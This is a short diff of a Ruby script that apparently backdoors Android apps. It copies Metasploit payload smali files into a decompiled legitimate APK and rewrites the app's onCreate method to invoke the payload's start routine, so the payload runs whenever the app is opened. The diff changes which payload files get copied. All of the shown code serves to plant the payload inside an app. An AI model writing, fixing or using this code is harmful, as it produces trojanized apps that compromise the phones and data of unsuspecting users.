@@ -211,8 +211,8 @@ rescue Errno::ENOENT
 end
 
 print "[*] Copying payload files..\n"
-FileUtils.mkdir_p('original/smali/com/metasploit/stage/')
-FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'original/smali/com/metasploit/stage/'
+FileUtils.mkdir_p('original/smali/com/metasploit/')
+FileUtils.cp_r 'payload/smali/com/metasploit/.', 'original/smali/com/metasploit/'
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
 payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
